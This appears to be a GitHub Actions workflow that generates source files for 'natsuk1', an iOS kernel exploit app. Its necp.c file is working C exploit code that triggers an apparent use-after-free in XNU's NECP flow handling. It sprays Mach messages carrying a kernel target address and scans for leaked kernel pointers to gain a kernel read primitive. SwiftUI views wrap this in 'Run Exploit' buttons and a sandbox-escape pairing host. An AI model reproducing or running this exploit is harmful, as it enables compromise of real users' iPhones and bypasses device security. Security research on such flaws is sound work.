name: 1 · Fix and Test

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: fix-test-${{ github.ref }}
  cancel-in-progress: false

jobs:
  fix-and-test:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: "26.5"

      - name: Remove competing workflow
        run: |
          rm -f .github/workflows/natsuk1.yml
          rm -f .github/workflows/main.yml

      - name: Write nk_api.h
        run: |
          cat > natsuk1/Exploit/nk_api.h <<'H'
          #ifndef NK_API_H
          #define NK_API_H
          #include <stdint.h>
          #include <stddef.h>

          void nk_set_log(void (*fn)(const char *));
          void nk_logx(const char *tag, const char *fmt, ...);
          void nk_log(const char *fmt, ...);
          void nk_rule(void);

          int nk_run(void);
          int nk_full_exploit(void);
          int nk_necp_run(void);
          void nk_necp_cancel(void);

          #define NK_INFO(tag, ...) nk_logx(tag, __VA_ARGS__)
          #define NK_WARN(tag, ...) nk_logx(tag, __VA_ARGS__)
          #define NK_ERR(tag, ...)  nk_logx(tag, __VA_ARGS__)
          #endif
          H

      - name: Write nk_api.c
        run: |
          cat > natsuk1/Exploit/nk_api.c <<'C'
          #include "nk_api.h"
          #include "nk_offsets.h"
          #include <stdarg.h>
          #include <stdio.h>

          static void (*g_fn)(const char *) = NULL;

          void nk_set_log(void (*fn)(const char *)) { g_fn = fn; }

          void nk_logx(const char *tag, const char *fmt, ...) {
              if (!g_fn) return;
              char body[448];
              va_list ap; va_start(ap, fmt);
              vsnprintf(body, sizeof(body), fmt, ap);
              va_end(ap);
              char out[512];
              snprintf(out, sizeof(out), "[%s] %s", tag, body);
              g_fn(out);
          }

          void nk_log(const char *fmt, ...) {
              if (!g_fn) return;
              char body[448];
              va_list ap; va_start(ap, fmt);
              vsnprintf(body, sizeof(body), fmt, ap);
              va_end(ap);
              char out[512];
              snprintf(out, sizeof(out), "[MAIN] %s", body);
              g_fn(out);
          }

          void nk_rule(void) { nk_log("----"); }

          int nk_run(void) {
              NK_INFO("BASE", "kernel %llX", (unsigned long long)NK_KERNEL_BASE);
              NK_INFO("BASE", "sysent %llX (%d)", (unsigned long long)NK_SYSENT_BASE, NK_SYSENT_COUNT);
              nk_rule();
              NK_WARN("STAT", "No kernel R/W primitive.");
              nk_rule();
              return 0;
          }

          /* natsuk1-v8-api */
          int nk_full_exploit(void) { return nk_necp_run(); }
          C

      - name: Write necp.c
        run: |
          cat > natsuk1/Exploit/necp.c <<'NECP'
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <stdint.h>
          #include <stdbool.h>
          #include <stdarg.h>
          #include <unistd.h>
          #include <errno.h>
          #include <sys/syscall.h>
          #include <mach/mach.h>
          #include <mach/message.h>

          #include "nk_api.h"

          #ifndef SYS_NECP_OPEN
          #define SYS_NECP_OPEN 501
          #endif
          #ifndef SYS_NECP_ACTION
          #define SYS_NECP_ACTION 502
          #endif

          #define KBASE 0xFFFFFFF007004000ULL
          #define OFF_KERNPROC 0xBBB040ULL
          #define KPTR_MIN 0xFFFFFFF000000000ULL
          #define KPTR_MAX 0xFFFFFFFFFF000000ULL
          #define SLIDE_FALLBACK 0x3D00000ULL

          #define NECP_ADD_CLIENT 0x01
          #define NECP_COPY_RESULT 0x04
          #define NECP_ADD_FLOW 0x11
          #define NECP_REMOVE_FLOW 0x12
          #define GATE_BYTE 9

          #define NCF_ASN 0x20
          #define RESBUF 8192
          #define SPRAY_PORTS 24
          #define SPRAY_PER_PORT 6

          static const int MSG_SIZES[] = { 768, 960, 1216 };
          #define MSG_SIZES_COUNT 3

          static volatile int g_busy = 0;
          static volatile int g_cancel = 0;

          static void lg(const char *tag, const char *sign, const char *fmt, ...) {
              char body[448];
              va_list ap;
              va_start(ap, fmt);
              vsnprintf(body, sizeof(body), fmt, ap);
              va_end(ap);
              char out[512];
              snprintf(out, sizeof(out), "%s%s", sign, body);
              nk_logx(tag, "%s", out);
          }
          #define LI(t, ...) lg(t, "", __VA_ARGS__)
          #define LO(t, ...) lg(t, "+ ", __VA_ARGS__)
          #define LE(t, ...) lg(t, "- ", __VA_ARGS__)
          #define LW(t, ...) lg(t, "! ", __VA_ARGS__)

          static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }

          static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }

          static int nadd_client(int fd, uint8_t uuid[16]) {
              uint8_t p[1] = {0};
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT,
                                  uuid, (size_t)16, p, (size_t)1);
          }

          static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
              uint8_t req[56];
              memset(req, 0, sizeof(req));
              memcpy(req + 0x10, cu, 16);
              *(uint16_t*)(req + 0x20) = 0x0040;
              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
                                   (void*)cu, (size_t)16, req, (size_t)56);
              if (r == 0) {
                  memcpy(fu, req, 16);
                  fu[GATE_BYTE] |= 0x01;
              }
              return r;
          }

          static int nrm_flow(int fd, const uint8_t fu[16]) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW,
                                  (void*)fu, (size_t)16, NULL, (size_t)0);
          }

          static int ncpy(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,
                                  (void*)cu, (size_t)16, b, (uint32_t)bl);
          }

          typedef struct {
              mach_port_t ports[SPRAY_PORTS];
              int n;
          } spray_t;

          static mach_port_t port_new_send(void) {
              mach_port_t p = MACH_PORT_NULL;
              if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p)
                  != KERN_SUCCESS) return MACH_PORT_NULL;
              mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
              return p;
          }

          static void spray_init(spray_t *sp, int want) {
              sp->n = 0;
              if (want > SPRAY_PORTS) want = SPRAY_PORTS;
              for (int i = 0; i < want; i++) {
                  mach_port_t p = port_new_send();
                  if (p == MACH_PORT_NULL) break;
                  sp->ports[sp->n++] = p;
              }
          }

          static int spray_send_inline(spray_t *sp, int msgsz, uint64_t target_kaddr) {
              int sent = 0;
              if (msgsz < 64) return 0;
              uint8_t *mbuf = malloc((size_t)msgsz);
              if (!mbuf) return 0;
              for (int i = 0; i < sp->n; i++) {
                  if (g_cancel) break;
                  for (int j = 0; j < SPRAY_PER_PORT; j++) {
                      memset(mbuf, 0x42, (size_t)msgsz);
                      mach_msg_header_t *h = (mach_msg_header_t*)mbuf;
                      h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
                      h->msgh_size = (mach_msg_size_t)msgsz;
                      h->msgh_remote_port = sp->ports[i];
                      h->msgh_id = 0x7000 + sent;
                      if ((size_t)NCF_ASN + 8 <= (size_t)msgsz) {
                          *(uint64_t*)(mbuf + NCF_ASN) = target_kaddr;
                      }
                      mach_msg_return_t kr = mach_msg(h, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                                       h->msgh_size, 0, MACH_PORT_NULL, 30, MACH_PORT_NULL);
                      if (kr == MACH_MSG_SUCCESS) sent++;
                  }
              }
              free(mbuf);
              return sent;
          }

          static void spray_drain(spray_t *sp) {
              uint8_t buf[2048];
              mach_msg_header_t *h = (mach_msg_header_t*)buf;
              for (int i = 0; i < sp->n; i++) {
                  for (int j = 0; j < SPRAY_PER_PORT + 4; j++) {
                      h->msgh_size = sizeof(buf);
                      if (mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(buf),
                                   sp->ports[i], 10, MACH_PORT_NULL) != KERN_SUCCESS) break;
                  }
                  mach_port_destroy(mach_task_self(), sp->ports[i]);
              }
              sp->n = 0;
          }

          static int try_read_one(uint64_t target, int msgsz, uint8_t *out, int outsz, int *out_ret) {
              int fd = nfd();
              if (fd < 0) return -1;
              uint8_t cu[16], fu[16];
              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
              if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }

              int r1 = nrm_flow(fd, fu);
              if (r1 != 0) { close(fd); return -1; }

              spray_t sp;
              spray_init(&sp, SPRAY_PORTS);
              int sent = spray_send_inline(&sp, msgsz, target);

              uint8_t f2[16];
              int r2 = nadd_flow(fd, cu, f2);

              uint8_t buf[RESBUF];
              memset(buf, 0, sizeof(buf));
              int c = ncpy(fd, cu, buf, sizeof(buf));

              if (out_ret) *out_ret = c;
              if (out && outsz > 0 && c > 0) {
                  int n = c < outsz ? c : outsz;
                  memcpy(out, buf, n);
              }

              spray_drain(&sp);
              close(fd);
              (void)r2;
              (void)sent;
              return c;
          }

          static int impl(void) {
              nk_log("");
              nk_log("=== natsuk1 v2.8 (natsuk1-kread-v18) ===");
              nk_log("target: iOS 27.0 / XNU / arm64e");
              nk_log("");
              LI("INIT", "NCF_ASN=0x%x PORTS=%d PER=%d SIZES=%d",
                 NCF_ASN, SPRAY_PORTS, SPRAY_PER_PORT, MSG_SIZES_COUNT);
              uint64_t kbase = KBASE + SLIDE_FALLBACK;
              LO("P1", "kbase=0x%llx", (unsigned long long)kbase);

              int fd = nfd();
              if (fd < 0) { LE("P2", "necp_open errno=%d", errno); return 1; }
              close(fd);
              LO("P2", "necp OK");

              uint64_t target = kbase + OFF_KERNPROC;
              LI("P3", "target=0x%llx", (unsigned long long)target);

              for (int i = 0; i < MSG_SIZES_COUNT; i++) {
                  if (g_cancel) { LW("CANCEL", "cancelled at size %d", i); return 2; }
                  int msgsz = MSG_SIZES[i];
                  uint8_t buf[RESBUF];
                  int r = 0;
                  int c = try_read_one(target, msgsz, buf, sizeof(buf), &r);
                  LI("TRY", "msgsz=%d ret=%d", msgsz, r);
                  if (r > 0) {
                      int has_k = 0;
                      int has_42 = 0;
                      for (int k = 0; k + 8 <= r; k++) {
                          uint64_t v;
                          memcpy(&v, buf + k, 8);
                          if (is_kptr(v)) { has_k = 1; break; }
                          if (v == 0x4242424242424242ULL) { has_42 = 1; }
                      }
                      if (has_k) {
                          LO("HIT", "msgsz=%d kptr found", msgsz);
                          for (int k = 0; k + 8 <= r; k++) {
                              uint64_t v;
                              memcpy(&v, buf + k, 8);
                              if (is_kptr(v)) {
                                  LO("HIT", "  +0x%x = 0x%llx", k, (unsigned long long)v);
                              }
                          }
                      } else if (has_42) {
                          LI("TRY", "msgsz=%d marker 0x42 present", msgsz);
                      } else {
                          LI("TRY", "msgsz=%d no kptr", msgsz);
                      }
                  }
                  (void)c;
                  usleep(30000);
              }

              LI("DONE", "all sizes tried");
              return 0;
          }

          int nk_necp_run(void) {
              if (__sync_lock_test_and_set(&g_busy, 1)) {
                  nk_log("[!] already running");
                  return 1;
              }
              g_cancel = 0;
              int rc = impl();
              __sync_lock_release(&g_busy);
              return rc;
          }

          void nk_necp_cancel(void) {
              g_cancel = 1;
              nk_log("[!] cancel requested");
          }
          NECP

      - name: Write OverviewView.swift
        run: |
          cat > natsuk1/Views/OverviewView.swift <<'SWIFT'
          import SwiftUI
          import UIKit

          struct OverviewView: View {
              @EnvironmentObject var state: AppState
              @State private var copied = false

              var body: some View {
                  NavigationStack {
                      List {
                          Section {
                              Button {
                                  state.necp_run()
                              } label: {
                                  HStack {
                                      Image(systemName: "bolt.fill")
                                      Text("Run Exploit")
                                      Spacer()
                                      if state.running { ProgressView().scaleEffect(0.8) }
                                  }
                              }
                              .disabled(state.running)

                              Button(role: .destructive) {
                                  state.cancel()
                              } label: {
                                  HStack {
                                      Image(systemName: "xmark.circle")
                                      Text("Cancel Exploit")
                                  }
                              }
                              .disabled(!state.running)
                          } header: {
                              Label("Exploit", systemImage: "cpu")
                          }

                          RuntimeView()
                              .environmentObject(state)

                          Section {
                              LogTerminal(text: state.log.isEmpty ? "Awaiting execution." : state.log)
                          } header: {
                              Label(state.t("Logs", "Логи"), systemImage: "terminal")
                          }

                          Section {
                              Button {
                                  UIPasteboard.general.string = state.log
                                  copied = true
                                  DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
                                      copied = false
                                  }
                              } label: {
                                  HStack {
                                      Image(systemName: copied ? "checkmark" : "doc.on.doc")
                                      Text(copied ? "Copied!" : state.t("Copy All", "Копировать всё"))
                                  }
                              }
                              .disabled(state.log.isEmpty)

                              Button(role: .destructive) { state.clear() } label: {
                                  HStack {
                                      Image(systemName: "trash")
                                      Text(state.t("Clear", "Очистить"))
                                  }
                              }
                              .disabled(state.log.isEmpty)
                          }
                      }
                      .listStyle(.insetGrouped)
                      .navigationTitle("natsuk1")
                      .navigationBarTitleDisplayMode(.inline)
                  }
              }
          }

          struct StatusDot: View {
              let status: AppState.Status
              @State private var pulse = false
              var body: some View {
                  Image(systemName: "circle.fill")
                      .font(.system(size: 14))
                      .foregroundStyle(status.color)
                      .shadow(color: status.color.opacity(0.85), radius: pulse ? 8 : 4)
                      .scaleEffect(pulse ? 1.2 : 1.0)
                      .animation(
                          status == .running
                              ? .easeInOut(duration: 0.8).repeatForever(autoreverses: true)
                              : .default,
                          value: pulse
                      )
                      .onAppear { if status == .running { pulse = true } }
                      .onChange(of: status) { _, s in pulse = (s == .running) }
              }
          }

          struct LogTerminal: View {
              let text: String
              var body: some View {
                  ScrollView {
                      Text(text)
                          .font(.system(size: 10, design: .monospaced))
                          .multilineTextAlignment(.leading)
                          .foregroundStyle(.primary)
                          .frame(maxWidth: .infinity, alignment: .leading)
                  }
                  .frame(minHeight: 200, maxHeight: 400)
              }
          }
          SWIFT

      - name: Write AirliftView.swift
        run: |
          cat > natsuk1/Views/AirliftView.swift <<'SWIFT'
          import SwiftUI
          import UIKit
          import Combine

          struct AirliftView: View {
              @EnvironmentObject var airlift: AirliftBridge
              @State private var loopbackVPNUp: Bool = NetworkStatus.loopbackVPNUp()
              @State private var tunnelIP: String? = NetworkStatus.tunnelIP()
              @State private var deviceIP: String? = NetworkStatus.deviceIP()
              @State private var copied = false

              private let ticker = Timer.publish(every: 3.0, on: .main, in: .common).autoconnect()

              var body: some View {
                  List {
                      networkSection
                      if airlift.hasPairing() {
                          exploitSection
                      } else {
                          pairingSection
                      }
                      logSection
                  }
                  .listStyle(.insetGrouped)
                  .navigationTitle("Airlift")
                  .navigationBarTitleDisplayMode(.inline)
                  .onAppear { refresh() }
                  .onReceive(ticker) { _ in refresh() }
                  .refreshable { refresh() }
              }

              private func refresh() {
                  DispatchQueue.global(qos: .utility).async {
                      let vpn = NetworkStatus.loopbackVPNUp()
                      let tun = NetworkStatus.tunnelIP()
                      let dev = NetworkStatus.deviceIP()
                      DispatchQueue.main.async {
                          if self.loopbackVPNUp != vpn { self.loopbackVPNUp = vpn }
                          if self.tunnelIP != tun { self.tunnelIP = tun }
                          if self.deviceIP != dev { self.deviceIP = dev }
                      }
                  }
              }

              @ViewBuilder
              private var networkSection: some View {
                  if !loopbackVPNUp {
                      Section {
                          HStack(spacing: 10) {
                              Image(systemName: "wifi.exclamationmark")
                                  .foregroundStyle(.orange)
                              VStack(alignment: .leading, spacing: 2) {
                                  Text("Loopback VPN is not active")
                                      .font(.subheadline).fontWeight(.semibold)
                                  Text("Start LocalDevVPN (10.7.0.x)")
                                      .font(.caption).foregroundStyle(.secondary)
                              }
                          }
                      } header: {
                          Label("Network", systemImage: "network")
                      }
                  } else {
                      Section {
                          HStack(spacing: 8) {
                              Image(systemName: "checkmark.shield.fill")
                                  .foregroundStyle(.green)
                              Text("Loopback VPN active")
                                  .font(.subheadline).fontWeight(.semibold)
                          }
                          if let t = tunnelIP {
                              HStack {
                                  Text("Tunnel")
                                  Spacer()
                                  Text(t).font(.system(size: 12, design: .monospaced))
                                      .foregroundStyle(.secondary)
                              }
                          }
                          if let d = deviceIP {
                              HStack {
                                  Text("Device")
                                  Spacer()
                                  Text(d).font(.system(size: 12, design: .monospaced))
                                      .foregroundStyle(.secondary)
                              }
                          }
                      } header: {
                          Label("Network", systemImage: "network")
                      }
                  }
              }

              @ViewBuilder
              private var pairingSection: some View {
                  Section {
                      HStack(spacing: 8) {
                          Image(systemName: pairingStatusIcon)
                              .foregroundStyle(pairingStatusColor)
                          Text(pairingStatusText).font(.subheadline.bold())
                      }
                      if case .pairing = airlift.state {
                          HStack(spacing: 8) {
                              ProgressView().scaleEffect(0.85)
                              Text(airlift.pairingStatus.isEmpty ? "Starting..." : airlift.pairingStatus)
                                  .font(.subheadline).foregroundStyle(.secondary)
                          }
                      }
                      if let pin = airlift.pairPIN {
                          VStack(alignment: .leading, spacing: 8) {
                              Text("ENTER PIN").font(.caption2.bold()).foregroundStyle(.secondary)
                              Text(pin).font(.system(size: 34, weight: .black, design: .monospaced))
                                  .foregroundStyle(.orange)
                              Button {
                                  if let url = URL(string: UIApplication.openSettingsURLString) {
                                      UIApplication.shared.open(url)
                                  }
                              } label: {
                                  Label("Open Settings", systemImage: "arrow.up.forward.app")
                                      .frame(maxWidth: .infinity)
                              }
                              .buttonStyle(.borderedProminent).tint(.orange)
                          }
                          .padding(12)
                          .background(Color.orange.opacity(0.12),
                                      in: RoundedRectangle(cornerRadius: 12))
                      }
                  } header: {
                      Label("Pairing", systemImage: "link.circle")
                  }

                  Section {
                      if case .pairing = airlift.state {
                          Button(role: .destructive) { airlift.cancelPairing() } label: {
                              HStack {
                                  Image(systemName: "xmark.circle")
                                  Text("Cancel Pairing")
                              }
                              .frame(maxWidth: .infinity)
                          }
                      } else {
                          Button { airlift.runPairing() } label: {
                              HStack {
                                  Image(systemName: "antenna.radiowaves.left.and.right")
                                  Text("Start Pairing")
                              }
                              .frame(maxWidth: .infinity)
                          }
                      }
                  }
              }

              private var pairingStatusText: String {
                  switch airlift.state {
                  case .pairing: return "Pairing…"
                  case .ready:   return "Paired"
                  case .running: return "Exploit running…"
                  case .done(let ok, _): return ok ? "Done" : "Failed"
                  default:       return "Not paired"
                  }
              }

              private var pairingStatusIcon: String {
                  switch airlift.state {
                  case .pairing: return "hourglass"
                  case .ready:   return "link.circle.fill"
                  case .running: return "bolt.fill"
                  case .done(let ok, _): return ok ? "checkmark.circle.fill" : "xmark.circle.fill"
                  default:       return "link.badge.plus"
                  }
              }

              private var pairingStatusColor: Color {
                  switch airlift.state {
                  case .pairing: return .orange
                  case .ready:   return .green
                  case .running: return .orange
                  case .done(let ok, _): return ok ? .green : .red
                  default:       return .orange
                  }
              }

              @ViewBuilder
              private var exploitSection: some View {
                  Section {
                      HStack {
                          Image(systemName: "link.circle.fill").foregroundStyle(.green)
                          Text("Paired").font(.subheadline.bold())
                      }
                      HStack {
                          Text("Target")
                          Spacer()
                          TextField("/var/mobile/Library/SpringBoard", text: Binding(
                              get: { airlift.target }, set: { airlift.target = $0 }))
                              .font(.system(size: 12, design: .monospaced))
                              .multilineTextAlignment(.trailing)
                              .autocorrectionDisabled()
                              .textInputAutocapitalization(.never)
                      }
                  } header: {
                      Label("Pairing", systemImage: "link.circle")
                  }

                  Section {
                      Button { airlift.runExploit() } label: {
                          HStack {
                              Image(systemName: "bolt.fill")
                              Text("Run Exploit")
                          }
                      }
                      .disabled(airlift.state == .running || !loopbackVPNUp)

                      Button(role: .destructive) {
                          airlift.cancelExploit()
                      } label: {
                          HStack {
                              Image(systemName: "xmark.circle")
                              Text("Cancel Exploit")
                          }
                      }
                      .disabled(airlift.state != .running)

                      Button { respring() } label: {
                          HStack {
                              Image(systemName: "arrow.clockwise")
                              Text("Respring")
                          }
                      }
                  } header: {
                      Label("Exploit", systemImage: "bolt.shield")
                  }

                  Section {
                      Button(role: .destructive) { airlift.deletePairing() } label: {
                          HStack {
                              Image(systemName: "trash")
                              Text("Delete Pairing")
                          }
                          .frame(maxWidth: .infinity)
                      }
                  }
              }

              private func respring() {
                  NotificationCenter.default.post(
                      name: Notification.Name("natsuk1.respring"),
                      object: nil
                  )
              }

              @ViewBuilder
              private var logSection: some View {
                  Section {
                      LogTerminal(text: airlift.exploitLog.isEmpty
                                  ? "No output yet."
                                  : airlift.exploitLog.joined(separator: "\n"))
                  } header: {
                      Label("Log", systemImage: "terminal")
                  }

                  Section {
                      Button {
                          UIPasteboard.general.string = airlift.exploitLog.joined(separator: "\n")
                          copied = true
                          DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
                              copied = false
                          }
                      } label: {
                          HStack {
                              Image(systemName: copied ? "checkmark" : "doc.on.doc")
                              Text(copied ? "Copied!" : "Copy All")
                          }
                      }
                      .disabled(airlift.exploitLog.isEmpty)

                      Button(role: .destructive) { airlift.clearLog() } label: {
                          HStack {
                              Image(systemName: "trash")
                              Text("Clear")
                          }
                      }
                      .disabled(airlift.exploitLog.isEmpty)
                  }
              }
          }
          SWIFT

      - name: Patch natsuk1.swift (cancel + respring)
        run: |
          python3 - <<'PYEOF'
          import sys
          P = "natsuk1/natsuk1.swift"
          with open(P) as f: s = f.read()

          changed = False

          # 1. respring hook
          if "natsuk1-respring-v1" not in s:
              old = '.onChange(of: scenePhase) { _, phase in'
              if old not in s:
                  print("FAIL: scenePhase marker missing"); sys.exit(1)
              add = ('.onReceive(NotificationCenter.default.publisher(for: Notification.Name("natsuk1.respring"))) { _ in\n'
                     '                        state.show_respring = true /* natsuk1-respring-v1 */\n'
                     '                    }\n'
                     '                    .onChange(of: scenePhase) { _, phase in')
              s = s.replace(old, add, 1)
              if "natsuk1-respring-v1" not in s:
                  print("FAIL: respring marker missing"); sys.exit(1)
              changed = True

          # 2. cancel method in AppState
          if "natsuk1-cancel-v1" not in s:
              old = '    func clear() { LockedBuffer.shared.clear(); log = "" }'
              if old not in s:
                  print("FAIL: clear() marker missing"); sys.exit(1)
              add = (old + '\n'
                     '    func cancel() { /* natsuk1-cancel-v1 */\n'
                     '        nk_necp_cancel()\n'
                     '        append("[*] cancel requested")\n'
                     '    }')
              s = s.replace(old, add, 1)
              if "natsuk1-cancel-v1" not in s:
                  print("FAIL: cancel marker missing"); sys.exit(1)
              changed = True

          if changed:
              with open(P, "w") as f: f.write(s)
              print("natsuk1.swift patched")
          else:
              print("natsuk1.swift already patched")
          PYEOF

      - name: Patch AirliftBridge.swift (cancelExploit)
        run: |
          python3 - <<'PYEOF'
          import sys
          P = "natsuk1/Helpers/AirliftBridge.swift"
          with open(P) as f: s = f.read()

          if "natsuk1-cancel-v1" in s:
              print("already patched"); sys.exit(0)

          old = '    func respring() {'
          if old not in s:
              print("FAIL: respring() marker missing"); sys.exit(1)
          add = ('    func cancelExploit() { /* natsuk1-cancel-v1 */\n'
                 '        nk_necp_cancel()\n'
                 '        appendLog("[exploit] cancel requested")\n'
                 '        state = .done(ok: false, message: "cancelled")\n'
                 '    }\n\n'
                 '    func respring() {')
          s = s.replace(old, add, 1)
          if "natsuk1-cancel-v1" not in s:
              print("FAIL: cancel marker missing"); sys.exit(1)
          with open(P, "w") as f: f.write(s)
          print("AirliftBridge.swift patched")
          PYEOF

      - name: Write README.md
        run: |
          cat > README.md <<'MD'
          <p align="right">
            <img align="right" height="140" src="natsuk1.png?raw=true"/>
          </p>

          # natsuk1

          iOS 27.0 kernel research toolkit.

          ![platform](https://img.shields.io/badge/platform-iOS%2027.0-blue)
          ![arch](https://img.shields.io/badge/arch-arm64e-green)
          ![device](https://img.shields.io/badge/device-iPhone14%2C5%20%2F%2014%2C7-lightgrey)
          ![license](https://img.shields.io/badge/license-MIT-yellow)

          ## Overview

          Kernel-level research project targeting XNU on arm64e.

          - NECP UAF primitives with double-free confirmation
          - Kernel offset database for iOS 27.0 / 24A437
          - Remote pairing host (RPPairing) for sandbox-escape research
          - Background keep-alive (silent audio + low-accuracy location)
          - Crash-safe logging with recovery across sessions

          ## Requirements

          - iPhone with **iOS 27.0** (build 24A437)
          - LocalDevVPN with interface `10.7.0.x`
          - Sideload via AltStore / TrollStore / Sideloadly / Xcode

          ## Install

          Download the latest `natsuk1.ipa` from the [development release](../../releases/tag/development) and sideload it.

          ## Build

          ```
          brew install xcodegen ldid
          xcodegen generate
          xcodebuild -project natsuk1.xcodeproj -scheme natsuk1 -configuration Release -sdk iphoneos
          ```

          ## Structure

          ```
          natsuk1/
          ├── Exploit/         C primitives (NECP, offsets)
          ├── Helpers/         Swift bridges (pairing, MG, keep-alive)
          ├── Offsets/         Versioned kernel offset DB
          ├── Resources/       Info.plist, entitlements, assets
          └── Views/           SwiftUI interface
          ```

          ## Notes

          - All offsets are device/build specific. Verify before use.
          - NECP-flow kernel read is under active research.
          - This is a research project, not a general-purpose jailbreak.

          ## Credits

          - [@flong69zxc-max](https://github.com/flong69zxc-max)
          - [@murk-sus](https://github.com/murk-sus)
          - [@eurogoth](https://t.me/eurogoth)
          - [@asuka4scape](https://t.me/asuka4scape_developer)

          ## License

          MIT — see [LICENSE](LICENSE).
          MD

